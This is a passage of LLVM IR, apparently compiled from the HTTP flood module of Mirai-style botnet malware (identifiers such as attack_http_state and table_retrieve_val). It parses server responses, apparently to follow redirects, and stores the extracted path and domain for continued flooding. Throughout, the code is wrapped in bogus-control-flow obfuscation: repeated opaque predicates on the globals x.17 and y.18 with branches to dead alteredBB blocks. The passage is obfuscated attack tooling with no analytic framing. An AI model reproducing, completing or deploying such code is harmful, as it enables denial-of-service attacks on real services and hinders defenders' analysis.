  br label %2236

; <label>:2236:                                   ; preds = %2235, %originalBBpart2374
  br label %2237

; <label>:2237:                                   ; preds = %2236, %originalBBpart2358
  %2238 = load i32, i32* @x.17
  %2239 = load i32, i32* @y.18
  %2240 = sub i32 %2238, 1
  %2241 = mul i32 %2238, %2240
  %2242 = urem i32 %2241, 2
  %2243 = icmp eq i32 %2242, 0
  %2244 = icmp slt i32 %2239, 10
  %2245 = or i1 %2243, %2244
  br i1 %2245, label %originalBB376, label %originalBB376alteredBB

originalBB376:                                    ; preds = %originalBB376alteredBB, %2237
  %2246 = load i32, i32* @x.17
  %2247 = load i32, i32* @y.18
  %2248 = sub i32 %2246, 1
  %2249 = mul i32 %2246, %2248
  %2250 = urem i32 %2249, 2
  %2251 = icmp eq i32 %2250, 0
  %2252 = icmp slt i32 %2247, 10
  %2253 = or i1 %2251, %2252
  br i1 %2253, label %originalBBpart2378, label %originalBB376alteredBB

originalBBpart2378:                               ; preds = %originalBB376
  br label %2254

; <label>:2254:                                   ; preds = %originalBBpart2378, %2002
  %2255 = load i32, i32* %47, align 4
  %2256 = load i32, i32* %37, align 4
  %2257 = add nsw i32 %2256, %2255
  store i32 %2257, i32* %37, align 4
  br label %1967

; <label>:2258:                                   ; preds = %1981
  %2259 = load i32, i32* @x.17
  %2260 = load i32, i32* @y.18
  %2261 = sub i32 %2259, 1
  %2262 = mul i32 %2259, %2261
  %2263 = urem i32 %2262, 2
  %2264 = icmp eq i32 %2263, 0
  %2265 = icmp slt i32 %2260, 10
  %2266 = or i1 %2264, %2265
  br i1 %2266, label %originalBB380, label %originalBB380alteredBB

originalBB380:                                    ; preds = %originalBB380alteredBB, %2258
  %2267 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2268 = load i32, i32* %12, align 4
  %2269 = call i8* @table_retrieve_val(i32 54, i32* null)
  %2270 = call i32 @util_stristr(i8* %2267, i32 %2268, i8* %2269)
  %2271 = icmp ne i32 %2270, -1
  %2272 = load i32, i32* @x.17
  %2273 = load i32, i32* @y.18
  %2274 = sub i32 %2272, 1
  %2275 = mul i32 %2272, %2274
  %2276 = urem i32 %2275, 2
  %2277 = icmp eq i32 %2276, 0
  %2278 = icmp slt i32 %2273, 10
  %2279 = or i1 %2277, %2278
  br i1 %2279, label %originalBBpart2382, label %originalBB380alteredBB

originalBBpart2382:                               ; preds = %originalBB380
  br i1 %2271, label %2280, label %2651

; <label>:2280:                                   ; preds = %originalBBpart2382
  %2281 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2282 = load i32, i32* %12, align 4
  %2283 = call i8* @table_retrieve_val(i32 54, i32* null)
  %2284 = call i32 @util_stristr(i8* %2281, i32 %2282, i8* %2283)
  store i32 %2284, i32* %52, align 4
  %2285 = load i32, i32* %52, align 4
  %2286 = sext i32 %2285 to i64
  %2287 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2286
  %2288 = load i8, i8* %2287, align 1
  %2289 = sext i8 %2288 to i32
  %2290 = icmp eq i32 %2289, 32
  br i1 %2290, label %2291, label %2294

; <label>:2291:                                   ; preds = %2280
  %2292 = load i32, i32* %52, align 4
  %2293 = add nsw i32 %2292, 1
  store i32 %2293, i32* %52, align 4
  br label %2294

; <label>:2294:                                   ; preds = %2291, %2280
  %2295 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2296 = load i32, i32* %52, align 4
  %2297 = sext i32 %2296 to i64
  %2298 = getelementptr inbounds i8, i8* %2295, i64 %2297
  %2299 = load i32, i32* %12, align 4
  %2300 = load i32, i32* %52, align 4
  %2301 = sub nsw i32 %2299, %2300
  %2302 = call i32 @util_memsearch(i8* %2298, i32 %2301, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2302, i32* %53, align 4
  %2303 = load i32, i32* %53, align 4
  %2304 = icmp ne i32 %2303, -1
  br i1 %2304, label %2305, label %2634

; <label>:2305:                                   ; preds = %2294
  %2306 = load i32, i32* %52, align 4
  %2307 = sext i32 %2306 to i64
  %2308 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2307
  store i8* %2308, i8** %54, align 8
  %2309 = load i32, i32* %53, align 4
  %2310 = icmp sge i32 %2309, 2
  br i1 %2310, label %2311, label %2330

; <label>:2311:                                   ; preds = %2305
  %2312 = load i32, i32* @x.17
  %2313 = load i32, i32* @y.18
  %2314 = sub i32 %2312, 1
  %2315 = mul i32 %2312, %2314
  %2316 = urem i32 %2315, 2
  %2317 = icmp eq i32 %2316, 0
  %2318 = icmp slt i32 %2313, 10
  %2319 = or i1 %2317, %2318
  br i1 %2319, label %originalBB384, label %originalBB384alteredBB

originalBB384:                                    ; preds = %originalBB384alteredBB, %2311
  %2320 = load i32, i32* %53, align 4
  %2321 = sub nsw i32 %2320, 2
  store i32 %2321, i32* %53, align 4
  %2322 = load i32, i32* @x.17
  %2323 = load i32, i32* @y.18
  %2324 = sub i32 %2322, 1
  %2325 = mul i32 %2322, %2324
  %2326 = urem i32 %2325, 2
  %2327 = icmp eq i32 %2326, 0
  %2328 = icmp slt i32 %2323, 10
  %2329 = or i1 %2327, %2328
  br i1 %2329, label %originalBBpart2393, label %originalBB384alteredBB

originalBBpart2393:                               ; preds = %originalBB384
  br label %2330

; <label>:2330:                                   ; preds = %originalBBpart2393, %2305
  %2331 = load i32, i32* %52, align 4
  %2332 = load i32, i32* %53, align 4
  %2333 = add nsw i32 %2331, %2332
  %2334 = sext i32 %2333 to i64
  %2335 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2334
  store i8 0, i8* %2335, align 1
  %2336 = load i32, i32* %53, align 4
  %2337 = add nsw i32 %2336, 1
  store i32 %2337, i32* %53, align 4
  %2338 = load i8*, i8** %54, align 8
  %2339 = load i32, i32* %53, align 4
  %2340 = call i32 @util_memsearch(i8* %2338, i32 %2339, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i32 4)
  %2341 = icmp eq i32 %2340, 4
  br i1 %2341, label %2342, label %2528

; <label>:2342:                                   ; preds = %2330
  store i32 7, i32* %10, align 4
  %2343 = load i8*, i8** %54, align 8
  %2344 = getelementptr inbounds i8, i8* %2343, i64 4
  %2345 = load i8, i8* %2344, align 1
  %2346 = sext i8 %2345 to i32
  %2347 = icmp eq i32 %2346, 115
  br i1 %2347, label %2348, label %2351

; <label>:2348:                                   ; preds = %2342
  %2349 = load i32, i32* %10, align 4
  %2350 = add nsw i32 %2349, 1
  store i32 %2350, i32* %10, align 4
  br label %2351

; <label>:2351:                                   ; preds = %2348, %2342
  %2352 = load i8*, i8** %54, align 8
  %2353 = load i8*, i8** %54, align 8
  %2354 = load i32, i32* %10, align 4
  %2355 = sext i32 %2354 to i64
  %2356 = getelementptr inbounds i8, i8* %2353, i64 %2355
  %2357 = load i32, i32* %53, align 4
  %2358 = load i32, i32* %10, align 4
  %2359 = sub nsw i32 %2357, %2358
  %2360 = sext i32 %2359 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2352, i8* %2356, i64 %2360, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %2361

; <label>:2361:                                   ; preds = %2398, %2351
  %2362 = load i8*, i8** %54, align 8
  %2363 = load i32, i32* %10, align 4
  %2364 = sext i32 %2363 to i64
  %2365 = getelementptr inbounds i8, i8* %2362, i64 %2364
  %2366 = load i8, i8* %2365, align 1
  %2367 = sext i8 %2366 to i32
  %2368 = icmp ne i32 %2367, 0
  br i1 %2368, label %2369, label %2401

; <label>:2369:                                   ; preds = %2361
  %2370 = load i32, i32* @x.17
  %2371 = load i32, i32* @y.18
  %2372 = sub i32 %2370, 1
  %2373 = mul i32 %2370, %2372
  %2374 = urem i32 %2373, 2
  %2375 = icmp eq i32 %2374, 0
  %2376 = icmp slt i32 %2371, 10
  %2377 = or i1 %2375, %2376
  br i1 %2377, label %originalBB395, label %originalBB395alteredBB

originalBB395:                                    ; preds = %originalBB395alteredBB, %2369
  %2378 = load i8*, i8** %54, align 8
  %2379 = load i32, i32* %10, align 4
  %2380 = sext i32 %2379 to i64
  %2381 = getelementptr inbounds i8, i8* %2378, i64 %2380
  %2382 = load i8, i8* %2381, align 1
  %2383 = sext i8 %2382 to i32
  %2384 = icmp eq i32 %2383, 47
  %2385 = load i32, i32* @x.17
  %2386 = load i32, i32* @y.18
  %2387 = sub i32 %2385, 1
  %2388 = mul i32 %2385, %2387
  %2389 = urem i32 %2388, 2
  %2390 = icmp eq i32 %2389, 0
  %2391 = icmp slt i32 %2386, 10
  %2392 = or i1 %2390, %2391
  br i1 %2392, label %originalBBpart2397, label %originalBB395alteredBB

originalBBpart2397:                               ; preds = %originalBB395
  br i1 %2384, label %2393, label %2398

; <label>:2393:                                   ; preds = %originalBBpart2397
  %2394 = load i8*, i8** %54, align 8
  %2395 = load i32, i32* %10, align 4
  %2396 = sext i32 %2395 to i64
  %2397 = getelementptr inbounds i8, i8* %2394, i64 %2396
  store i8 0, i8* %2397, align 1
  br label %2401

; <label>:2398:                                   ; preds = %originalBBpart2397
  %2399 = load i32, i32* %10, align 4
  %2400 = add nsw i32 %2399, 1
  store i32 %2400, i32* %10, align 4
  br label %2361

; <label>:2401:                                   ; preds = %2393, %2361
  %2402 = load i32, i32* @x.17
  %2403 = load i32, i32* @y.18
  %2404 = sub i32 %2402, 1
  %2405 = mul i32 %2402, %2404
  %2406 = urem i32 %2405, 2
  %2407 = icmp eq i32 %2406, 0
  %2408 = icmp slt i32 %2403, 10
  %2409 = or i1 %2407, %2408
  br i1 %2409, label %originalBB399, label %originalBB399alteredBB

originalBB399:                                    ; preds = %originalBB399alteredBB, %2401
  %2410 = load i8*, i8** %54, align 8
  %2411 = call i32 @util_strlen(i8* %2410)
  %2412 = icmp sgt i32 %2411, 0
  %2413 = load i32, i32* @x.17
  %2414 = load i32, i32* @y.18
  %2415 = sub i32 %2413, 1
  %2416 = mul i32 %2413, %2415
  %2417 = urem i32 %2416, 2
  %2418 = icmp eq i32 %2417, 0
  %2419 = icmp slt i32 %2414, 10
  %2420 = or i1 %2418, %2419
  br i1 %2420, label %originalBBpart2401, label %originalBB399alteredBB

originalBBpart2401:                               ; preds = %originalBB399
  br i1 %2412, label %2421, label %2463

; <label>:2421:                                   ; preds = %originalBBpart2401
  %2422 = load i32, i32* @x.17
  %2423 = load i32, i32* @y.18
  %2424 = sub i32 %2422, 1
  %2425 = mul i32 %2422, %2424
  %2426 = urem i32 %2425, 2
  %2427 = icmp eq i32 %2426, 0
  %2428 = icmp slt i32 %2423, 10
  %2429 = or i1 %2427, %2428
  br i1 %2429, label %originalBB403, label %originalBB403alteredBB

originalBB403:                                    ; preds = %originalBB403alteredBB, %2421
  %2430 = load i8*, i8** %54, align 8
  %2431 = call i32 @util_strlen(i8* %2430)
  %2432 = icmp slt i32 %2431, 128
  %2433 = load i32, i32* @x.17
  %2434 = load i32, i32* @y.18
  %2435 = sub i32 %2433, 1
  %2436 = mul i32 %2433, %2435
  %2437 = urem i32 %2436, 2
  %2438 = icmp eq i32 %2437, 0
  %2439 = icmp slt i32 %2434, 10
  %2440 = or i1 %2438, %2439
  br i1 %2440, label %originalBBpart2405, label %originalBB403alteredBB

originalBBpart2405:                               ; preds = %originalBB403
  br i1 %2432, label %2441, label %2463

; <label>:2441:                                   ; preds = %originalBBpart2405
  %2442 = load i32, i32* @x.17
  %2443 = load i32, i32* @y.18
  %2444 = sub i32 %2442, 1
  %2445 = mul i32 %2442, %2444
  %2446 = urem i32 %2445, 2
  %2447 = icmp eq i32 %2446, 0
  %2448 = icmp slt i32 %2443, 10
  %2449 = or i1 %2447, %2448
  br i1 %2449, label %originalBB407, label %originalBB407alteredBB

originalBB407:                                    ; preds = %originalBB407alteredBB, %2441
  %2450 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2451 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2450, i32 0, i32 7
  %2452 = getelementptr inbounds [129 x i8], [129 x i8]* %2451, i32 0, i32 0
  %2453 = load i8*, i8** %54, align 8
  %2454 = call i32 @util_strcpy(i8* %2452, i8* %2453)
  %2455 = load i32, i32* @x.17
  %2456 = load i32, i32* @y.18
  %2457 = sub i32 %2455, 1
  %2458 = mul i32 %2455, %2457
  %2459 = urem i32 %2458, 2
  %2460 = icmp eq i32 %2459, 0
  %2461 = icmp slt i32 %2456, 10
  %2462 = or i1 %2460, %2461
  br i1 %2462, label %originalBBpart2409, label %originalBB407alteredBB

originalBBpart2409:                               ; preds = %originalBB407
  br label %2463

; <label>:2463:                                   ; preds = %originalBBpart2409, %originalBBpart2405, %originalBBpart2401
  %2464 = load i8*, i8** %54, align 8
  %2465 = load i32, i32* %10, align 4
  %2466 = add nsw i32 %2465, 1
  %2467 = sext i32 %2466 to i64
  %2468 = getelementptr inbounds i8, i8* %2464, i64 %2467
  %2469 = call i32 @util_strlen(i8* %2468)
  %2470 = icmp slt i32 %2469, 256
  br i1 %2470, label %2471, label %2511

; <label>:2471:                                   ; preds = %2463
  %2472 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2473 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2472, i32 0, i32 6
  %2474 = getelementptr inbounds [257 x i8], [257 x i8]* %2473, i32 0, i32 0
  %2475 = getelementptr inbounds i8, i8* %2474, i64 1
  call void @util_zero(i8* %2475, i32 255)
  %2476 = load i8*, i8** %54, align 8
  %2477 = load i32, i32* %10, align 4
  %2478 = add nsw i32 %2477, 1
  %2479 = sext i32 %2478 to i64
  %2480 = getelementptr inbounds i8, i8* %2476, i64 %2479
  %2481 = call i32 @util_strlen(i8* %2480)
  %2482 = icmp sgt i32 %2481, 0
  br i1 %2482, label %2483, label %2494

; <label>:2483:                                   ; preds = %2471
  %2484 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2485 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2484, i32 0, i32 6
  %2486 = getelementptr inbounds [257 x i8], [257 x i8]* %2485, i32 0, i32 0
  %2487 = getelementptr inbounds i8, i8* %2486, i64 1
  %2488 = load i8*, i8** %54, align 8
  %2489 = load i32, i32* %10, align 4
  %2490 = add nsw i32 %2489, 1
  %2491 = sext i32 %2490 to i64
  %2492 = getelementptr inbounds i8, i8* %2488, i64 %2491
  %2493 = call i32 @util_strcpy(i8* %2487, i8* %2492)
  br label %2494

; <label>:2494:                                   ; preds = %2483, %2471
  %2495 = load i32, i32* @x.17
  %2496 = load i32, i32* @y.18
  %2497 = sub i32 %2495, 1
  %2498 = mul i32 %2495, %2497
  %2499 = urem i32 %2498, 2
  %2500 = icmp eq i32 %2499, 0
  %2501 = icmp slt i32 %2496, 10
  %2502 = or i1 %2500, %2501
  br i1 %2502, label %originalBB411, label %originalBB411alteredBB

originalBB411:                                    ; preds = %originalBB411alteredBB, %2494
  %2503 = load i32, i32* @x.17
  %2504 = load i32, i32* @y.18
  %2505 = sub i32 %2503, 1
  %2506 = mul i32 %2503, %2505
  %2507 = urem i32 %2506, 2
  %2508 = icmp eq i32 %2507, 0
  %2509 = icmp slt i32 %2504, 10
  %2510 = or i1 %2508, %2509
  br i1 %2510, label %originalBBpart2413, label %originalBB411alteredBB

originalBBpart2413:                               ; preds = %originalBB411
  br label %2511

; <label>:2511:                                   ; preds = %originalBBpart2413, %2463
  %2512 = load i32, i32* @x.17
  %2513 = load i32, i32* @y.18
  %2514 = sub i32 %2512, 1
  %2515 = mul i32 %2512, %2514
  %2516 = urem i32 %2515, 2
  %2517 = icmp eq i32 %2516, 0
  %2518 = icmp slt i32 %2513, 10
  %2519 = or i1 %2517, %2518
  br i1 %2519, label %originalBB415, label %originalBB415alteredBB

originalBB415:                                    ; preds = %originalBB415alteredBB, %2511
  %2520 = load i32, i32* @x.17
  %2521 = load i32, i32* @y.18
  %2522 = sub i32 %2520, 1
  %2523 = mul i32 %2520, %2522
  %2524 = urem i32 %2523, 2
  %2525 = icmp eq i32 %2524, 0
  %2526 = icmp slt i32 %2521, 10
  %2527 = or i1 %2525, %2526
  br i1 %2527, label %originalBBpart2417, label %originalBB415alteredBB

originalBBpart2417:                               ; preds = %originalBB415
  br label %2631

; <label>:2528:                                   ; preds = %2330
  %2529 = load i32, i32* @x.17
  %2530 = load i32, i32* @y.18
  %2531 = sub i32 %2529, 1
  %2532 = mul i32 %2529, %2531
  %2533 = urem i32 %2532, 2
  %2534 = icmp eq i32 %2533, 0
  %2535 = icmp slt i32 %2530, 10
  %2536 = or i1 %2534, %2535
  br i1 %2536, label %originalBB419, label %originalBB419alteredBB

originalBB419:                                    ; preds = %originalBB419alteredBB, %2528
  %2537 = load i8*, i8** %54, align 8
  %2538 = getelementptr inbounds i8, i8* %2537, i64 0
  %2539 = load i8, i8* %2538, align 1
  %2540 = sext i8 %2539 to i32
  %2541 = icmp eq i32 %2540, 47
  %2542 = load i32, i32* @x.17
  %2543 = load i32, i32* @y.18
  %2544 = sub i32 %2542, 1
  %2545 = mul i32 %2542, %2544
  %2546 = urem i32 %2545, 2
  %2547 = icmp eq i32 %2546, 0
  %2548 = icmp slt i32 %2543, 10
  %2549 = or i1 %2547, %2548
  br i1 %2549, label %originalBBpart2421, label %originalBB419alteredBB

originalBBpart2421:                               ; preds = %originalBB419
  br i1 %2541, label %2550, label %2614

; <label>:2550:                                   ; preds = %originalBBpart2421
  %2551 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2552 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2551, i32 0, i32 6
  %2553 = getelementptr inbounds [257 x i8], [257 x i8]* %2552, i32 0, i32 0
  %2554 = getelementptr inbounds i8, i8* %2553, i64 1
  call void @util_zero(i8* %2554, i32 255)
  %2555 = load i8*, i8** %54, align 8
  %2556 = load i32, i32* %10, align 4
  %2557 = add nsw i32 %2556, 1
  %2558 = sext i32 %2557 to i64
  %2559 = getelementptr inbounds i8, i8* %2555, i64 %2558
  %2560 = call i32 @util_strlen(i8* %2559)
  %2561 = icmp sgt i32 %2560, 0
  br i1 %2561, label %2562, label %2597

; <label>:2562:                                   ; preds = %2550
  %2563 = load i32, i32* @x.17
  %2564 = load i32, i32* @y.18
  %2565 = sub i32 %2563, 1
  %2566 = mul i32 %2563, %2565
  %2567 = urem i32 %2566, 2
  %2568 = icmp eq i32 %2567, 0
  %2569 = icmp slt i32 %2564, 10
  %2570 = or i1 %2568, %2569
  br i1 %2570, label %originalBB423, label %originalBB423alteredBB

originalBB423:                                    ; preds = %originalBB423alteredBB, %2562
  %2571 = load i8*, i8** %54, align 8
  %2572 = load i32, i32* %10, align 4
  %2573 = add nsw i32 %2572, 1
  %2574 = sext i32 %2573 to i64
  %2575 = getelementptr inbounds i8, i8* %2571, i64 %2574
  %2576 = call i32 @util_strlen(i8* %2575)
  %2577 = icmp slt i32 %2576, 256
  %2578 = load i32, i32* @x.17
  %2579 = load i32, i32* @y.18
  %2580 = sub i32 %2578, 1
  %2581 = mul i32 %2578, %2580
  %2582 = urem i32 %2581, 2
  %2583 = icmp eq i32 %2582, 0
  %2584 = icmp slt i32 %2579, 10
  %2585 = or i1 %2583, %2584
  br i1 %2585, label %originalBBpart2432, label %originalBB423alteredBB

originalBBpart2432:                               ; preds = %originalBB423
  br i1 %2577, label %2586, label %2597

; <label>:2586:                                   ; preds = %originalBBpart2432
  %2587 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2588 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2587, i32 0, i32 6
  %2589 = getelementptr inbounds [257 x i8], [257 x i8]* %2588, i32 0, i32 0
  %2590 = getelementptr inbounds i8, i8* %2589, i64 1
  %2591 = load i8*, i8** %54, align 8
  %2592 = load i32, i32* %10, align 4
  %2593 = add nsw i32 %2592, 1
  %2594 = sext i32 %2593 to i64
  %2595 = getelementptr inbounds i8, i8* %2591, i64 %2594
  %2596 = call i32 @util_strcpy(i8* %2590, i8* %2595)
  br label %2597

; <label>:2597:                                   ; preds = %2586, %originalBBpart2432, %2550
  %2598 = load i32, i32* @x.17
  %2599 = load i32, i32* @y.18
  %2600 = sub i32 %2598, 1
  %2601 = mul i32 %2598, %2600
  %2602 = urem i32 %2601, 2
  %2603 = icmp eq i32 %2602, 0
  %2604 = icmp slt i32 %2599, 10
  %2605 = or i1 %2603, %2604
  br i1 %2605, label %originalBB434, label %originalBB434alteredBB

originalBB434:                                    ; preds = %originalBB434alteredBB, %2597
  %2606 = load i32, i32* @x.17
  %2607 = load i32, i32* @y.18
  %2608 = sub i32 %2606, 1
  %2609 = mul i32 %2606, %2608
  %2610 = urem i32 %2609, 2
  %2611 = icmp eq i32 %2610, 0
  %2612 = icmp slt i32 %2607, 10
  %2613 = or i1 %2611, %2612
  br i1 %2613, label %originalBBpart2436, label %originalBB434alteredBB

originalBBpart2436:                               ; preds = %originalBB434
  br label %2614

; <label>:2614:                                   ; preds = %originalBBpart2436, %originalBBpart2421
  %2615 = load i32, i32* @x.17
  %2616 = load i32, i32* @y.18
  %2617 = sub i32 %2615, 1
  %2618 = mul i32 %2615, %2617
  %2619 = urem i32 %2618, 2
  %2620 = icmp eq i32 %2619, 0
  %2621 = icmp slt i32 %2616, 10
  %2622 = or i1 %2620, %2621
  br i1 %2622, label %originalBB438, label %originalBB438alteredBB

originalBB438:                                    ; preds = %originalBB438alteredBB, %2614
  %2623 = load i32, i32* @x.17
  %2624 = load i32, i32* @y.18
  %2625 = sub i32 %2623, 1
  %2626 = mul i32 %2623, %2625
  %2627 = urem i32 %2626, 2
  %2628 = icmp eq i32 %2627, 0
  %2629 = icmp slt i32 %2624, 10
  %2630 = or i1 %2628, %2629
  br i1 %2630, label %originalBBpart2440, label %originalBB438alteredBB

originalBBpart2440:                               ; preds = %originalBB438
  br label %2631

; <label>:2631:                                   ; preds = %originalBBpart2440, %originalBBpart2417
  %2632 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2633 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2632, i32 0, i32 1
  store i8 1, i8* %2633, align 4
  br label %4121

; <label>:2634:                                   ; preds = %2294
  %2635 = load i32, i32* @x.17
  %2636 = load i32, i32* @y.18
  %2637 = sub i32 %2635, 1
  %2638 = mul i32 %2635, %2637
  %2639 = urem i32 %2638, 2
  %2640 = icmp eq i32 %2639, 0
  %2641 = icmp slt i32 %2636, 10
  %2642 = or i1 %2640, %2641
  br i1 %2642, label %originalBB442, label %originalBB442alteredBB

originalBB442:                                    ; preds = %originalBB442alteredBB, %2634
  %2643 = load i32, i32* @x.17
  %2644 = load i32, i32* @y.18
  %2645 = sub i32 %2643, 1
  %2646 = mul i32 %2643, %2645
  %2647 = urem i32 %2646, 2
  %2648 = icmp eq i32 %2647, 0
  %2649 = icmp slt i32 %2644, 10
  %2650 = or i1 %2648, %2649
  br i1 %2650, label %originalBBpart2444, label %originalBB442alteredBB

originalBBpart2444:                               ; preds = %originalBB442
  br label %2651

; <label>:2651:                                   ; preds = %originalBBpart2444, %originalBBpart2382
  %2652 = load i32, i32* @x.17
  %2653 = load i32, i32* @y.18
  %2654 = sub i32 %2652, 1
  %2655 = mul i32 %2652, %2654
  %2656 = urem i32 %2655, 2
  %2657 = icmp eq i32 %2656, 0
  %2658 = icmp slt i32 %2653, 10
  %2659 = or i1 %2657, %2658
  br i1 %2659, label %originalBB446, label %originalBB446alteredBB

originalBB446:                                    ; preds = %originalBB446alteredBB, %2651
  %2660 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2661 = load i32, i32* %12, align 4
  %2662 = call i8* @table_retrieve_val(i32 53, i32* null)
  %2663 = call i32 @util_stristr(i8* %2660, i32 %2661, i8* %2662)
  %2664 = icmp ne i32 %2663, -1
  %2665 = load i32, i32* @x.17
  %2666 = load i32, i32* @y.18
  %2667 = sub i32 %2665, 1
  %2668 = mul i32 %2665, %2667
  %2669 = urem i32 %2668, 2
  %2670 = icmp eq i32 %2669, 0
  %2671 = icmp slt i32 %2666, 10
  %2672 = or i1 %2670, %2671
  br i1 %2672, label %originalBBpart2448, label %originalBB446alteredBB

originalBBpart2448:                               ; preds = %originalBB446
  br i1 %2664, label %2673, label %3291

; <label>:2673:                                   ; preds = %originalBBpart2448
  %2674 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2675 = load i32, i32* %12, align 4
  %2676 = call i8* @table_retrieve_val(i32 53, i32* null)
  %2677 = call i32 @util_stristr(i8* %2674, i32 %2675, i8* %2676)
  store i32 %2677, i32* %55, align 4
  %2678 = load i32, i32* %55, align 4
  %2679 = sext i32 %2678 to i64
  %2680 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2679
  %2681 = load i8, i8* %2680, align 1
  %2682 = sext i8 %2681 to i32
  %2683 = icmp eq i32 %2682, 32
  br i1 %2683, label %2684, label %2703

; <label>:2684:                                   ; preds = %2673
  %2685 = load i32, i32* @x.17
  %2686 = load i32, i32* @y.18
  %2687 = sub i32 %2685, 1
  %2688 = mul i32 %2685, %2687
  %2689 = urem i32 %2688, 2
  %2690 = icmp eq i32 %2689, 0
  %2691 = icmp slt i32 %2686, 10
  %2692 = or i1 %2690, %2691
  br i1 %2692, label %originalBB450, label %originalBB450alteredBB

originalBB450:                                    ; preds = %originalBB450alteredBB, %2684
  %2693 = load i32, i32* %55, align 4
  %2694 = add nsw i32 %2693, 1
  store i32 %2694, i32* %55, align 4
  %2695 = load i32, i32* @x.17
  %2696 = load i32, i32* @y.18
  %2697 = sub i32 %2695, 1
  %2698 = mul i32 %2695, %2697
  %2699 = urem i32 %2698, 2
  %2700 = icmp eq i32 %2699, 0
  %2701 = icmp slt i32 %2696, 10
  %2702 = or i1 %2700, %2701
  br i1 %2702, label %originalBBpart2454, label %originalBB450alteredBB

originalBBpart2454:                               ; preds = %originalBB450
  br label %2703

; <label>:2703:                                   ; preds = %originalBBpart2454, %2673
  %2704 = load i32, i32* @x.17
  %2705 = load i32, i32* @y.18
  %2706 = sub i32 %2704, 1
  %2707 = mul i32 %2704, %2706
  %2708 = urem i32 %2707, 2
  %2709 = icmp eq i32 %2708, 0
  %2710 = icmp slt i32 %2705, 10
  %2711 = or i1 %2709, %2710
  br i1 %2711, label %originalBB456, label %originalBB456alteredBB

originalBB456:                                    ; preds = %originalBB456alteredBB, %2703
  %2712 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2713 = load i32, i32* %55, align 4
  %2714 = sext i32 %2713 to i64
  %2715 = getelementptr inbounds i8, i8* %2712, i64 %2714
  %2716 = load i32, i32* %12, align 4
  %2717 = load i32, i32* %55, align 4
  %2718 = sub nsw i32 %2716, %2717
  %2719 = call i32 @util_memsearch(i8* %2715, i32 %2718, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2719, i32* %56, align 4
  %2720 = load i32, i32* %56, align 4
  %2721 = icmp ne i32 %2720, -1
  %2722 = load i32, i32* @x.17
  %2723 = load i32, i32* @y.18
  %2724 = sub i32 %2722, 1
  %2725 = mul i32 %2722, %2724
  %2726 = urem i32 %2725, 2
  %2727 = icmp eq i32 %2726, 0
  %2728 = icmp slt i32 %2723, 10
  %2729 = or i1 %2727, %2728
  br i1 %2729, label %originalBBpart2473, label %originalBB456alteredBB

originalBBpart2473:                               ; preds = %originalBB456
  br i1 %2721, label %2730, label %3274

; <label>:2730:                                   ; preds = %originalBBpart2473
  %2731 = load i32, i32* %55, align 4
  %2732 = sext i32 %2731 to i64
  %2733 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2732
  store i8* %2733, i8** %57, align 8
  %2734 = load i32, i32* %56, align 4
  %2735 = icmp sge i32 %2734, 2
  br i1 %2735, label %2736, label %2739

; <label>:2736:                                   ; preds = %2730
  %2737 = load i32, i32* %56, align 4
  %2738 = sub nsw i32 %2737, 2
  store i32 %2738, i32* %56, align 4
  br label %2739

; <label>:2739:                                   ; preds = %2736, %2730
  %2740 = load i32, i32* %55, align 4
  %2741 = load i32, i32* %56, align 4
  %2742 = add nsw i32 %2740, %2741
  %2743 = sext i32 %2742 to i64
  %2744 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2743
  store i8 0, i8* %2744, align 1
  %2745 = load i32, i32* %56, align 4
  %2746 = add nsw i32 %2745, 1
  store i32 %2746, i32* %56, align 4
  store i32 0, i32* %10, align 4
  br label %2747

; <label>:2747:                                   ; preds = %originalBBpart2480, %2739
  %2748 = load i8*, i8** %57, align 8
  %2749 = load i32, i32* %10, align 4
  %2750 = sext i32 %2749 to i64
  %2751 = getelementptr inbounds i8, i8* %2748, i64 %2750
  %2752 = load i8, i8* %2751, align 1
  %2753 = sext i8 %2752 to i32
  %2754 = icmp ne i32 %2753, 0
  br i1 %2754, label %2755, label %2771

; <label>:2755:                                   ; preds = %2747
  %2756 = load i8*, i8** %57, align 8
  %2757 = load i32, i32* %10, align 4
  %2758 = sext i32 %2757 to i64
  %2759 = getelementptr inbounds i8, i8* %2756, i64 %2758
  %2760 = load i8, i8* %2759, align 1
  %2761 = sext i8 %2760 to i32
  %2762 = icmp sge i32 %2761, 48
  br i1 %2762, label %2763, label %2771

; <label>:2763:                                   ; preds = %2755
  %2764 = load i8*, i8** %57, align 8
  %2765 = load i32, i32* %10, align 4
  %2766 = sext i32 %2765 to i64
  %2767 = getelementptr inbounds i8, i8* %2764, i64 %2766
  %2768 = load i8, i8* %2767, align 1
